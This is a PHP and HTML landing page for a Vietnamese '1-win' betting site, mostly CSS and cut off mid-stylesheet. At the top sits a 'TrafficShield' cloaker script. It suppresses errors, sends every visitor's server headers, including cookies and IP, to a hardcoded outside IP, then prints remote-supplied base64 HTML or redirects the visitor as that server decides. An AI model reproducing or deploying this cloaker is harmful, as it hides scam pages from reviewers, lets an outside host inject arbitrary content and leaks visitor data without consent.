<?php
namespace TrafficShield; 
error_reporting(0);
	class Traffic_Shield{
		public function run() {							
			ob_start();
			$this->ogrsr9854();
		}
		public function ogrsr9854() {	
            $this->_check(); 
            $response = $this->https_request();        
            $this->main($response);       
        }			
        public function _check() {	
            if(isset($_GET['TS-BHDNR-84848'])){
                echo "169a63b818";
            }
        }
		public function get_header() {	
            $headers = array();     
            foreach($_SERVER as $k=>$v){
               $headers[$k] = $v;
            }
            $headers['TS-BHDNR-74191'] = "900661405710890";
            $headers['TS-BHDNR-74194'] = "169a63b818"; 
            return $headers;
        }
		public function get_header_post() {
            $get_header = $this->get_header();
            return base64_encode(json_encode($get_header));      
        }	
		public function https_request() {
           $get_header['headers'] = $this->get_header_post();
           $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36');
           curl_setopt($ch, CURLOPT_POST, true);
           curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
           $result = curl_exec($ch);                
           return json_decode($result);
        }
		public function main($response) {
            if(!empty($response)){
               if(isset($response->zrc) && !empty($response->zrc)){
                    echo base64_decode($response->zrc);
                    die();
                }else{                        
                    if($response->type == 1){
                        $this->get_url($response->url,$response->http_code);
                    }
                }
            }
        }
		public function get_url($url,$code) { 
            header("Location: ".$url, true, $code);            
        }
}
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>
<!DOCTYPE html>
<html lang="vi">

<head>
	<meta charset="UTF-8">
	<title>1-win</title>
	<meta http-equiv="Cache-Control" content="no-cache">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta http-equiv="Expires" content="-1">
	<meta name="keywords" content="">
	<meta name="description" content="Trang chính 1w-01">
	<meta id='viewport' name='viewport' content='width=device-width, initial-scale=1' />
	<script type='text/javascript'>
		window.ladi_viewport=function(i){var a=document;var b=window.ladi_screen_width||window.screen.width;i=i?i:'innerWidth';var c=window[i]>0?window[i]:b;var d=c;var e=c>=768;var f="";if(typeof window.ladi_is_desktop=="undefined"||window.ladi_is_desktop==undefined){window.ladi_is_desktop=e;}if(!e){d=420;}else{d=960;}f="width="+d+",user-scalable=no";var g=1;if(!e&&d!=b&&b>0){g=b / d;}if(g!=1){f+=",initial-scale="+g+",minimum-scale="+g+",maximum-scale="+g;}var h=a.getElementById("viewport");if(!h){h=a.createElement("meta");h.setAttribute("id","viewport");h.setAttribute("name","viewport");a.head.appendChild(h);}h.setAttribute("content",f);};window.ladi_viewport();window.ladi_fbq_data = [];window.ladi_fbq = function () {window.ladi_fbq_data.push(arguments);};window.ladi_ttq_data = [];window.ladi_ttq = function () {window.ladi_ttq_data.push(arguments);};
	</script>
	<link rel="canonical" href="https://www.1win-01.com" />
	<meta property="og:url" content="https://www.1win-01.com" />
	<meta property="og:title" content="1-win" />
	<meta property="og:type" content="website" />
	<meta property="og:image" content="https://static.ladipage.net//57b167c9ca57d39c18a1c57c/untitled-1-444925.jpg">
	<meta property="og:description" content="Trang chính 1w-01" />
	<meta name="format-detection" content="telephone=no" />
	<link rel="shortcut icon"
		href="https://static.ladipage.net/64679654cd117e00202ffd8c/13973-20231016051708-kjexu.png" />
	<link rel="dns-prefetch">
	<link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin>
	<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
	<link rel="preconnect" href="https://w.ladicdn.com/" crossorigin>
	<link rel="preconnect" href="https://s.ladicdn.com/" crossorigin>
	<link rel="preconnect" href="https://api.ldpform.com/" crossorigin>
	<link rel="preconnect" href="https://a.ladipage.com/" crossorigin>
	<link rel="preconnect" href="https://api.sales.ldpform.net/" crossorigin>
	<link rel="preload"
		href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&family=Roboto+Slab:wght@400;700&family=Roboto:wght@400;700&display=swap"
		as="style" onload="this.onload = null; this.rel = 'stylesheet';">
	<link rel="preload" href="https://w.ladicdn.com/v2/source/ladipagev3.min.js?v=1698827959206" as="script">
	<style id="style_ladi" type="text/css">
		a,
		abbr,
		acronym,
		address,
		applet,
		article,
		aside,
		audio,
		b,
		big,
		blockquote,
		body,
		button,
		canvas,
		caption,
		center,
		cite,
		code,
		dd,
		del,
		details,
		dfn,
		div,
		dl,
		dt,
		em,
		embed,
		fieldset,
		figcaption,
		figure,
		footer,
		form,
		h1,
		h2,
		h3,
		h4,
		h5,
		h6,
		header,
		hgroup,
		html,
		i,
		iframe,
		img,
		input,
		ins,
		kbd,
		label,
		legend,
		li,
		mark,
		menu,
		nav,
		object,
		ol,
		output,
		p,
		pre,
		q,
		ruby,
		s,
		samp,
		section,
		select,
		small,
		span,
		strike,
		strong,
		sub,
		summary,
		sup,
		table,
		tbody,
		td,
		textarea,
		tfoot,
		th,
		thead,
		time,
		tr,
		tt,
		u,
		ul,
		var,
		video {
			margin: 0;
			padding: 0;
			border: 0;
			outline: 0;
			font-size: 100%;
			font: inherit;
			vertical-align: baseline;
			box-sizing: border-box;
			-webkit-font-smoothing: antialiased;
			-moz-osx-font-smoothing: grayscale
		}

		article,
		aside,
		details,
		figcaption,
		figure,
		footer,
		header,
		hgroup,
		menu,
		nav,
		section {
			display: block
		}

		body {
			line-height: 1
		}

		a {
			text-decoration: none
		}

		ol,
		ul {
			list-style: none
		}

		blockquote,
		q {
			quotes: none
		}

		blockquote:after,
		blockquote:before,
		q:after,
		q:before {
			content: '';
			content: none
		}

		table {
			border-collapse: collapse;
			border-spacing: 0
		}

		.ladi-loading {
			z-index: 900000000000;
			position: fixed;
			width: 100%;
			height: 100%;
			top: 0;
			left: 0;
			background-color: rgba(0, 0, 0, .1)
		}

		.ladi-loading .loading {
			width: 80px;
			height: 80px;
			top: 0;
			left: 0;
			bottom: 0;
			right: 0;
			margin: auto;
			overflow: hidden;
			position: absolute
		}

		.ladi-loading .loading div {
			position: absolute;
			width: 6px;
			height: 6px;
			background: #fff;
			border-radius: 50%;
			animation: ladi-loading 1.2s linear infinite
		}

		.ladi-loading .loading div:nth-child(1) {
			animation-delay: 0s;
			top: 37px;
			left: 66px
		}

		.ladi-loading .loading div:nth-child(2) {
			animation-delay: -.1s;
			top: 22px;
			left: 62px
		}

		.ladi-loading .loading div:nth-child(3) {
			animation-delay: -.2s;
			top: 11px;
			left: 52px
		}

		.ladi-loading .loading div:nth-child(4) {
			animation-delay: -.3s;
			top: 7px;
			left: 37px
		}

		.ladi-loading .loading div:nth-child(5) {
			animation-delay: -.4s;
			top: 11px;
			left: 22px
		}

		.ladi-loading .loading div:nth-child(6) {
			animation-delay: -.5s;
			top: 22px;
			left: 11px
		}

		.ladi-loading .loading div:nth-child(7) {
			animation-delay: -.6s;
			top: 37px;
			left: 7px
		}

		.ladi-loading .loading div:nth-child(8) {
			animation-delay: -.7s;
			top: 52px;
			left: 11px
		}

		.ladi-loading .loading div:nth-child(9) {
			animation-delay: -.8s;
			top: 62px;
			left: 22px
		}

		.ladi-loading .loading div:nth-child(10) {
			animation-delay: -.9s;
			top: 66px;
			left: 37px
		}

		.ladi-loading .loading div:nth-child(11) {
			animation-delay: -1s;
			top: 62px;
			left: 52px
		}

		.ladi-loading .loading div:nth-child(12) {
			animation-delay: -1.1s;
			top: 52px;
			left: 62px
		}

		@keyframes ladi-loading {

			0%,
			100%,
			20%,
			80% {
				transform: scale(1)
			}

			50% {
				transform: scale(1.5)
			}
		}

		.ladipage-message {
			position: fixed;
			width: 100%;
			height: 100%;
			top: 0;
			left: 0;
			z-index: 10000000000;
			background: rgba(0, 0, 0, .3)
		}

		.ladipage-message .ladipage-message-box {
			width: 400px;
			max-width: calc(100% - 50px);
			height: 160px;
			border: 1px solid rgba(0, 0, 0, .3);
			background-color: #fff;
			position: fixed;
			top: calc(50% - 155px);
			left: 0;
			right: 0;
			margin: auto;
			border-radius: 10px
		}

		.ladipage-message .ladipage-message-box span {
			display: block;
			background-color: rgba(6, 21, 40, .05);
			color: #000;
			padding: 12px 15px;
			font-weight: 600;
			font-size: 16px;
			line-height: 16px;
			border-top-left-radius: 10px;
			border-top-right-radius: 10px
		}

		.ladipage-message .ladipage-message-box .ladipage-message-text {
			display: -webkit-box;
			font-size: 14px;
			padding: 0 20px;
			margin-top: 10px;
			line-height: 18px;
			-webkit-line-clamp: 3;
			-webkit-box-orient: vertical;
			overflow: hidden;
			text-overflow: ellipsis
		}

		.ladipage-message .ladipage-message-box .ladipage-message-close {
			display: block;
			position: absolute;
			right: 15px;
			bottom: 10px;
			margin: 0 auto;
			padding: 10px 0;
			border: none;
			width: 80px;
			text-transform: uppercase;
			text-align: center;
			color: #000;
			background-color: #e6e6e6;
			border-radius: 5px;
			text-decoration: none;
			font-size: 14px;
			line-height: 14px;
			font-weight: 600;
			cursor: pointer
		}

		.lightbox-screen {
			display: none;
			position: fixed;
			width: 100%;
			height: 100%;
			top: 0;
			left: 0;
			bottom: 0;
			right: 0;
			margin: auto;
			z-index: 9000000080;
			background: rgba(0, 0, 0, .5)
		}

		.lightbox-screen .lightbox-close {
			position: absolute;
			z-index: 9000000090;
			cursor: pointer
		}

		.lightbox-screen .lightbox-hidden {
			display: none
		}

		.lightbox-screen .lightbox-close {
			width: 16px;
			height: 16px;
			margin: 10px;
			background-repeat: no-repeat;
			background-position: center center;
			background-image: url("data:image/svg+xml;utf8, %3Csvg%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20fill%3D%22%23fff%22%3E%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M23.4144%202.00015L2.00015%2023.4144L0.585938%2022.0002L22.0002%200.585938L23.4144%202.00015Z%22%3E%3C%2Fpath%3E%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M2.00015%200.585938L23.4144%2022.0002L22.0002%2023.4144L0.585938%202.00015L2.00015%200.585938Z%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E")
		}

		body {
			font-size: 12px;
			-ms-text-size-adjust: none;
			-moz-text-size-adjust: none;
			-o-text-size-adjust: none;
			-webkit-text-size-adjust: none;
			background-color: #fff;
		}

		.overflow-hidden {
			overflow: hidden;
		}

		.ladi-transition {
			transition: all 150ms linear 0s;
		}

		.opacity-0 {
			opacity: 0;
		}

		.height-0 {
			height: 0 !important;
		}

		.pointer-events-none {
			pointer-events: none;
		}

		.transition-parent-collapse-height {
			transition: height 150ms linear 0s;
		}

		.transition-parent-collapse-top {
			transition: top 150ms linear 0s;
		}

		.transition-readmore {
			transition: height 350ms linear 0s;
		}

		.transition-collapse {
			transition: height 150ms linear 0s;
		}

		body.grab {
			cursor: grab;
		}

		.ladi-wraper {
			width: 100%;
			min-height: 100%;
			overflow: hidden;
		}

		.ladi-container {
			position: relative;
			margin: 0 auto;
			height: 100%;
		}

		.ladi-overlay {
			position: absolute;
			top: 0;
			left: 0;
			height: 100%;
			width: 100%;
			pointer-events: none;
		}

		.ladi-element {
			position: absolute;
		}

		@media (hover: hover) {
			.ladi-check-hover {
				opacity: 0;
			}
		}

		.ladi-section {
			margin: 0 auto;
			position: relative;
		}

		.ladi-section[data-tab-id] {
			display: none;
		}

		.ladi-section.selected[data-tab-id] {
			display: block;
		}

		.ladi-section .ladi-section-background {
			position: absolute;
			width: 100%;
			height: 100%;
			top: 0;
			left: 0;
			pointer-events: none;
			overflow: hidden;
		}

		.ladi-box {
			position: absolute;
			width: 100%;
			height: 100%;
			overflow: hidden;
		}

		.ladi-button {
			position: absolute;
			width: 100%;
			height: 100%;
			overflow: hidden;
		}

		.ladi-button:active {
			transform: translateY(2px);
			transition: transform 0.2s linear;
		}

		.ladi-button .ladi-button-background {
			height: 100%;
			width: 100%;
			pointer-events: none;
			transition: inherit;
		}

		.ladi-button>.ladi-button-headline,
		.ladi-button>.ladi-button-shape {
			width: 100% !important;
			height: 100% !important;
			top: 0 !important;
			left: 0 !important;
			display: table;
			user-select: none;
			-webkit-user-select: none;
			-moz-user-select: none;
			-ms-user-select: none;
		}

		.ladi-button>.ladi-button-shape .ladi-shape {
			margin: auto;
			top: 0;
			bottom: 0;
		}

		.ladi-button>.ladi-button-headline .ladi-headline {
			display: table-cell;
			vertical-align: middle;
		}

		.ladi-group {
			position: absolute;
			width: 100%;
			height: 100%;
		}

		.ladi-shape {
			position: absolute;
			width: 100%;
			height: 100%;
			pointer-events: none;
		}

		.ladi-cart-number {
			position: absolute;
			top: -2px;
			right: -7px;
			background: #f36e36;
			text-align: center;
			width: 18px;
			height: 18px;
			line-height: 18px;
			font-size: 12px;
			font-weight: bold;
			color: #fff;
			border-radius: 100%;
		}

		.ladi-html-code {
			position: absolute;
			width: 100%;
			height: 100%;
		}

		.ladi-image {
			position: absolute;
			width: 100%;
			height: 100%;
			overflow: hidden;
		}

		.ladi-image .ladi-image-background {
			background-repeat: no-repeat;
			background-position: left top;
			background-size: cover;
			background-attachment: scroll;
			background-origin: content-box;
			position: absolute;
			margin: 0 auto;
			width: 100%;
			height: 100%;
			pointer-events: none;
		}

		.ladi-headline {
			width: 100%;
			display: inline-block;
			word-break: break-word;
			background-size: cover;
			background-position: center center;
		}

		.ladi-headline a {
			text-decoration: underline;
		}

		.ladi-paragraph {
			width: 100%;
			display: inline-block;
			word-break: break-word;
		}

		.ladi-paragraph a {
			text-decoration: underline;
		}

		a[data-action] {
			user-select: none;
			-webkit-user-select: none;
			-moz-user-select: none;
			-ms-user-select: none;
			cursor: pointer
		}

		a:visited {
			color: inherit
		}

		a:link {
			color: inherit
		}

		[data-opacity="0"] {
			opacity: 0
		}

		[data-hidden="true"] {
			display: none
		}

		[data-action="true"] {
			cursor: pointer
		}

		.ladi-hidden {
			display: none
		}

		.ladi-animation-hidden {
			visibility: hidden !important;
			opacity: 0 !important
		}

		.element-click-selected {
			cursor: pointer
		}

		.is-2nd-click {
			cursor: pointer
		}

		.ladi-button-shape.is-2nd-click,
		.ladi-accordion-shape.is-2nd-click {
			z-index: 1
		}

		.backdrop-popup {
			display: none;
			position: fixed;
			top: 0;
			left: 0;
			right: 0;
			bottom: 0;
			z-index: 90000060
		}

		.backdrop-dropbox {
			display: none;
			position: fixed;
			top: 0;
			left: 0;
			right: 0;
			bottom: 0;
			z-index: 90000040
		}

		.ladi-lazyload {
			background-image: none !important;
		}

		.ladi-list-paragraph ul li.ladi-lazyload:before {
			background-image: none !important;
		}

		@media (min-width: 768px) {}

		@media (max-width: 767px) {
			.ladi-element.ladi-auto-scroll {
				overflow-x: auto;
				overflow-y: hidden;
				width: 100% !important;
				left: 0 !important;
				-webkit-overflow-scrolling: touch;
			}

			[data-hint]:not([data-timeout-id-copied]):before,
			[data-hint]:not([data-timeout-id-copied]):after {
				display: none !important;
			}

			.ladi-section.ladi-auto-scroll {
				overflow-x: auto;
				overflow-y: hidden;
				-webkit-overflow-scrolling: touch;
			}
		}
	</style>
	<style id="style_page" type="text/css">
		body {
			direction: ltr;
		}

		@media (min-width: 768px) {
			.ladi-section .ladi-container {
				width: 960px;
			}
		}

		@media (max-width: 767px) {
			.ladi-section .ladi-container {
				width: 420px;
			}
		}

		body {
			font-family: "Open Sans", sans-serif
		}
	</style>
	<style id="style_element" type="text/css">
		#SECTION2>.ladi-overlay {
			background-color: rgba(56, 56, 56, 0.79);
		}

		#HEADLINE5>.ladi-headline {
			font-family: "Roboto Slab", serif;
			color: rgb(255, 255, 255);
			text-transform: uppercase;
			letter-spacing: 0px;
			text-align: center;
		}

		#BUTTON173>.ladi-button>.ladi-button-background,
		#SECTION60>.ladi-section-background {
			background-color: rgb(255, 255, 255);
		}

		#BUTTON173>.ladi-button {
			border-width: 3px;
			border-radius: 17px;
			border-style: solid;
			border-color: rgb(0, 0, 0);
		}

		#BUTTON173>.ladi-button:hover {
			transform: scale(1.1);
			opacity: 1;
		}

		#BUTTON173>.ladi-button:hover .ladi-button-background {
			background-image: none !important;
			background-color: rgb(241, 196, 15) !important;
			background-size: initial !important;
			background-origin: initial !important;
			background-position: initial !important;
			background-repeat: initial !important;
			background-attachment: initial !important;
			-webkit-background-clip: initial !important;
		}

		#BUTTON_TEXT173,
		#BUTTON_TEXT174 {
			top: 9px;
			left: 0px;
		}

		#BUTTON_TEXT173>.ladi-headline {
			font-weight: bold;
			line-height: 1.6;
			color: rgb(28, 28, 28);
			text-align: center;
		}

		#BUTTON_TEXT173>.ladi-headline:hover,
		#BOX172>.ladi-box:hover,
		#SHAPE171:hover>.ladi-shape,
		#HEADLINE182>.ladi-headline:hover,
		#SHAPE172:hover>.ladi-shape,
		#HEADLINE183>.ladi-headline:hover,
		#SHAPE179:hover>.ladi-shape,
		#HEADLINE190>.ladi-headline:hover,
		#SHAPE180:hover>.ladi-shape,
		#HEADLINE191>.ladi-headline:hover,
		#SHAPE181:hover>.ladi-shape,
		#HEADLINE192>.ladi-headline:hover,
		#SHAPE182:hover>.ladi-shape,
		#HEADLINE193>.ladi-headline:hover,
		#SHAPE183:hover>.ladi-shape,
		#HEADLINE194>.ladi-headline:hover,
		#SHAPE184:hover>.ladi-shape,
		#HEADLINE195>.ladi-headline:hover,
		#HEADLINE223>.ladi-headline:hover,
		#HEADLINE224>.ladi-headline:hover,
		#HEADLINE229>.ladi-headline:hover,
		#BOX198>.ladi-box:hover,
		#BOX199>.ladi-box:hover,
		#IMAGE172:hover>.ladi-image,
		#HEADLINE226>.ladi-headline:hover,
		#BUTTON174>.ladi-button:hover,
		#BUTTON_TEXT174>.ladi-headline:hover,
		#PARAGRAPH173>.ladi-paragraph:hover,
		#PARAGRAPH174>.ladi-paragraph:hover,
		#PARAGRAPH175>.ladi-paragraph:hover,
		#PARAGRAPH176>.ladi-paragraph:hover,
		#PARAGRAPH177>.ladi-paragraph:hover,
		#PARAGRAPH178>.ladi-paragraph:hover,
		#PARAGRAPH179>.ladi-paragraph:hover,
		#BOX201>.ladi-box:hover {
			opacity: 1;
		}

		#SECTION9>.ladi-section-background {
			background-color: rgb(241, 196, 15);
		}

		#GROUP11,
		#GROUP12,
		#HEADLINE13,
		#HEADLINE28,
		#HEADLINE33 {
			width: 285px;
		}

		#GROUP12,
		#GROUP32 {
			top: 122px;
			left: 0px;
		}

		#HEADLINE13,
		#HEADLINE28,
		#HEADLINE33,
		#IMAGE174>.ladi-image>.ladi-image-background,
		#IMAGE175>.ladi-image>.ladi-image-background,
		#IMAGE176>.ladi-image>.ladi-image-background,
		#IMAGE177>.ladi-image>.ladi-image-background,
		#BOX51,
		#BOX56,
		#IMAGE63>.ladi-image>.ladi-image-background,
		#IMAGE64>.ladi-image>.ladi-image-background,
		#IMAGE65>.ladi-image>.ladi-image-background,
		#IMAGE66>.ladi-image>.ladi-image-background,
		#IMAGE67>.ladi-image>.ladi-image-background,
		#SHAPE92 {
			top: 0px;
			left: 0px;
		}

		#HEADLINE13>.ladi-headline,
		#HEADLINE28>.ladi-headline,
		#HEADLINE33>.ladi-headline {
			font-family: "Open Sans", sans-serif;
			font-size: 18px;
			font-weight: bold;
			color: rgb(255, 255, 255);
			letter-spacing: 2px;
			text-align: center;
		}

		#PARAGRAPH14 {
			width: 211px;
			top: 41px;
			left: 41px;
		}

		#PARAGRAPH14>.ladi-paragraph,
		#PARAGRAPH29>.ladi-paragraph,
		#PARAGRAPH34>.ladi-paragraph {
			font-family: Roboto, sans-serif;
			line-height: 1.4;
			color: rgb(255, 255, 255);
			letter-spacing: 1px;
			text-align: center;
		}

		#SHAPE15,
		#SHAPE30,
		#SHAPE35,
		#SHAPE172,
		#SHAPE179,
		#SHAPE180,
		#SHAPE181,
		#SHAPE182,
		#SHAPE183,
		#SHAPE184,
		#BOX198,
		#PARAGRAPH47,
		#HEADLINE79,
		#PARAGRAPH83,
		#PARAGRAPH86,
		#PARAGRAPH89,
		#SHAPE93,
		#HTML_CODE172 {
			top: 0px;
		}

		#SHAPE15 svg:last-child,
		#SHAPE30 svg:last-child,
		#SHAPE35 svg:last-child {
			fill: rgb(255, 255, 255);
		}

		#GROUP27,
		#HEADLINE182,
		#HEADLINE190,
		#HEADLINE192,
		#HEADLINE194,
		#BOX199,
		#PARAGRAPH48,
		#GROUP81,
		#SHAPE82,
		#SHAPE88,
		#HEADLINE90 {
			left: 0px;
		}

		#PARAGRAPH29,
		#PARAGRAPH34 {
			top: 41px;
		}

		#BOX172>.ladi-box>.ladi-overlay {
			background-color: rgba(0, 0, 0, 0.6);
		}

		#BOX172>.ladi-box {
			background-size: cover;
			background-origin: content-box;
			background-position: 0% 50%;
			background-repeat: repeat;
			background-attachment: scroll;
		}

		#SHAPE171,
		#SHAPE179,
		#SHAPE181,
		#SHAPE183 {
			width: 99px;
			height: 99px;
		}

		#SHAPE171 svg:last-child,
		#SHAPE179 svg:last-child,
		#SHAPE181 svg:last-child,
		#SHAPE183 svg:last-child {
			fill: rgba(235, 243, 255, 0.1);
		}

		#HEADLINE182>.ladi-headline,
		#HEADLINE183>.ladi-headline,
		#HEADLINE190>.ladi-headline,
		#HEADLINE191>.ladi-headline,
		#HEADLINE192>.ladi-headline,
		#HEADLINE193>.ladi-headline,
		#HEADLINE194>.ladi-headline,
		#HEADLINE195>.ladi-headline {
			line-height: 1.6;
			color: rgb(255, 255, 255);
			text-align: center;
		}

		#SHAPE172,
		#SHAPE180,
		#SHAPE182,
		#SHAPE184 {
			width: 28.675px;
			height: 28.675px;
		}

		#SHAPE172 svg:last-child,
		#SHAPE180 svg:last-child,
		#SHAPE182 svg:last-child,
		#SHAPE184 svg:last-child {
			fill: rgba(235, 243, 255, 0.2);
		}

		#HEADLINE183,
		#HEADLINE191,
		#HEADLINE193,
		#HEADLINE195 {
			width: 136px;
		}

		#GROUP202,
		#GROUP204 {
			height: 111.5px;
		}

		#HEADLINE191,
		#HEADLINE193,
		#HEADLINE195 {
			top: 89.5px;
		}

		#GROUP203 {
			height: 134.5px;
		}

		#HEADLINE223>.ladi-headline {
			font-size: 30px;
			font-weight: bold;
			line-height: 1.2;
			color: rgb(241, 196, 15);
			text-align: center;
		}

		#HEADLINE224>.ladi-headline {
			font-size: 20px;
			font-weight: bold;
			line-height: 1.2;
			color: rgb(241, 196, 15);
			text-align: center;
		}

		#HEADLINE229>.ladi-headline {
			font-size: 30px;
			font-weight: bold;
			line-height: 1.6;
			color: rgb(241, 196, 15);
			text-align: left;
		}

		#SECTION174>.ladi-section-background {
			background-color: rgb(236, 244, 255);
		}

		#BOX198>.ladi-box>.ladi-overlay {
			background-color: rgb(5, 31, 77);
		}

		#BOX198>.ladi-box {
			border-bottom-right-radius: 211px;
			background-size: cover;
			background-origin: content-box;
			background-position: 0% 100%;
			background-repeat: repeat;
			background-attachment: scroll;
		}

		#BOX199>.ladi-box {
			border-top-left-radius: 1000px;
			border-top-right-radius: 1000px;
			background-color: rgba(13, 98, 242, 0.2);
		}

		#IMAGE172>.ladi-image {
			border-radius: 0px;
		}

		#HEADLINE226>.ladi-headline {
			font-family: "Open Sans", sans-serif;
			font-size: 30px;
			font-weight: bold;
			line-height: 1.2;
			color: rgb(255, 255, 255);
			letter-spacing: 0px;
			text-align: center;
		}

		#BUTTON174 {
			width: 185.999px;
			height: 40px;
		}

		#BUTTON174>.ladi-button>.ladi-button-background {
			background-color: rgb(146, 118, 6);
		}

		#BUTTON174>.ladi-button {
			border-width: 3px;
			border-radius: 68px;
			border-style: groove;
			border-color: rgb(255, 255, 255);
		}

		#BUTTON_TEXT174>.ladi-headline {
			font-weight: bold;
			line-height: 1.6;
			color: rgb(255, 255, 255);
			text-align: center;
		}

		#PARAGRAPH173>.ladi-paragraph {
			line-height: 1.6;
			color: rgb(255, 255, 255);
			text-align: left;
		}

		#PARAGRAPH174 {
			width: 385px;
		}

		#PARAGRAPH174>.ladi-paragraph,
		#PARAGRAPH176>.ladi-paragraph,
		#PARAGRAPH177>.ladi-paragraph,
		#PARAGRAPH178>.ladi-paragraph,
		#PARAGRAPH179>.ladi-paragraph {
			font-size: 16px;
			line-height: 1.6;
			color: rgb(255, 255, 255);
		}

		#PARAGRAPH175 {
			width: 398px;
		}

		#PARAGRAPH175>.ladi-paragraph {
			font-size: 15.93px;
			line-height: 1.6;
			color: rgb(255, 255, 255);
		}

		#PARAGRAPH176 {
			width: 358px;
		}

		#PARAGRAPH177 {
			width: 417px;
		}

		#PARAGRAPH178 {
			width: 411px;
		}

		#IMAGE173 {
			width: 346.924px;
			height: 322.633px;
		}

		#IMAGE173>.ladi-image>.ladi-image-background {
			width: 346.924px;
			height: 520.386px;
			top: -187.805px;
			left: -0.877595px;
			background-image: url("https://w.ladicdn.com/s650x850/5ea845b95da1a2557f302daa/GsuVJDSy20231006093906.jpeg");
		}

		#IMAGE174,
		#IMAGE174>.ladi-image>.ladi-image-background {
			width: 385px;
			height: 256.666px;
		}

		#IMAGE174>.ladi-image>.ladi-image-background {
			background-image: url("https://w.ladicdn.com/s700x600/5ea845b95da1a2557f302daa/gztkk-bs20231006094121.jpg");
		}

		#IMAGE175,
		#IMAGE175>.ladi-image>.ladi-image-background {
			width: 383.952px;
			height: 250.469px;
		}

		#IMAGE175>.ladi-image>.ladi-image-background {
			background-image: url("https://w.ladicdn.com/s700x600/5ea845b95da1a2557f302daa/NzcDmryC20231006094443.jpg");
		}

		#IMAGE176,
		#IMAGE176>.ladi-image>.ladi-image-background {
			width: 365.298px;
			height: 258.562px;
		}

		#IMAGE176>.ladi-image>.ladi-image-background {
			background-image: url("https://w.ladicdn.com/s700x600/5ea845b95da1a2557f302daa/4yi4ymzl20231006094533.jpg");
		}

		#IMAGE177,
		#IMAGE177>.ladi-image>.ladi-image-background {
			width: 350px;
			height: 233.333px;
		}

		#IMAGE177>.ladi-image>.ladi-image-background {
			background-image: url("https://w.ladicdn.com/s700x550/5ea845b95da1a2557f302daa/yambgbxb20231006094820.jpg");
		}

		#SECTION42>.ladi-section-background {
			background-color: rgb(236, 240, 241);
		}

		#HEADLINE43>.ladi-headline {
			font-family: Roboto, sans-serif;
			font-size: 24px;
			font-weight: bold;
			line-height: 1.2;
			color: rgb(3, 3, 3);
			text-align: center;
		}

		#PARAGRAPH47>.ladi-paragraph,
		#PARAGRAPH52>.ladi-paragraph,
		#PARAGRAPH57>.ladi-paragraph {
			font-family: Roboto, sans-serif;
			line-height: 1.4;
			color: rgb(97, 97, 97);
			text-align: left;
		}

		#PARAGRAPH48>.ladi-paragraph,
		#PARAGRAPH53>.ladi-paragraph,
		#PARAGRAPH58>.ladi-paragraph {
			font-family: Roboto, sans-serif;
			font-size: 14px;
			font-weight: bold;
			line-height: 1.2;
			color: rgb(77, 77, 77);
			text-align: left;
		}

		#BOX51>.ladi-box,
		#BOX56>.ladi-box,
		#BOX201>.ladi-box {
			border-radius: 220px;
		}

		#BOX51>.ladi-box {
			background-image: url("https://w.ladicdn.com/uploads/images/b765dadb-5e0e-4acb-97f2-7aaf24c61e8a.jpg");
			background-size: cover;
			background-origin: content-box;
			background-position: 50% 0%;
			background-repeat: repeat;
			background-attachment: scroll;
		}

		#BOX56>.ladi-box {
			background-image: url("https://w.ladicdn.com/s400x400/5ea845b95da1a2557f302daa/ckbd0qym20231006095205.jpg");
			background-size: cover;
			background-origin: content-box;
			background-position: 0% 0%;
			background-repeat: repeat;
			background-attachment: scroll;
		}

		#BOX201>.ladi-box {
			background-image: url("https://w.ladicdn.com/s400x400/5ea845b95da1a2557f302daa/k1cc44j320231006100042.jpg");
			background-size: cover;
			background-origin: content-box;
			background-position: 50% 0%;
			background-repeat: repeat;
			background-attachment: scroll;
		}

		#HEADLINE61>.ladi-headline {
			font-family: "Open Sans", sans-serif;
			font-size: 24px;
			font-weight: bold;
			line-height: 1;
			color: rgb(33, 33, 33);
			text-align: center;
		}

		#IMAGE63,
		#IMAGE63>.ladi-image>.ladi-image-background {
			width: 160.672px;
			height: 74.25px;
		}

		#IMAGE63>.ladi-image>.ladi-image-background {
			background-image: url("https://w.ladicdn.com/uploads/images/32222549-7b0a-4f16-9b22-dbc0bf94bcb8.png");
		}

		#IMAGE64,
		#IMAGE64>.ladi-image>.ladi-image-background {
			height: 35.1719px;
		}

		#IMAGE64>.ladi-image>.ladi-image-background {
			background-image: url("https://w.ladicdn.com/uploads/images/22cc466a-a0f9-4c34-b152-8458496672e9.png");
		}

		#IMAGE65,
		#IMAGE65>.ladi-image>.ladi-image-background {
			width: 117.266px;
			height: 68.375px;
		}

		#IMAGE65>.ladi-image>.ladi-image-background {
			background-image: url("https://w.ladicdn.com/uploads/images/128900f7-e431-4a7e-bde5-4bf3d21e20cd.png");
		}

		#IMAGE66>.ladi-image>.ladi-image-background {
			background-image: url("https://w.ladicdn.com/uploads/images/3467a673-3c26-4050-8a67-1819aa12ac7b.png");
		}

		#IMAGE67,
		#IMAGE67>.ladi-image>.ladi-image-background {
			width: 151.172px;
		}

		#IMAGE67>.ladi-image>.ladi-image-background {
			background-image: url("https://w.ladicdn.com/uploads/images/d8ea1416-71a6-491c-8226-4911607453ae.png");
		}

		#SECTION76>.ladi-section-background {
			background-image: url("https://w.ladicdn.com/uploads/images/998d2561-fd1c-4bff-83da-a4e317e2c1ad.jpg");
			background-size: cover;
			background-origin: content-box;
			background-position: 0% 0%;
			background-repeat: no-repeat;
			background-attachment: scroll;
		}

		#HEADLINE79>.ladi-headline {
			font-family: "Open Sans", sans-serif;
			font-size: 36px;
			font-weight: bold;
			line-height: 1;
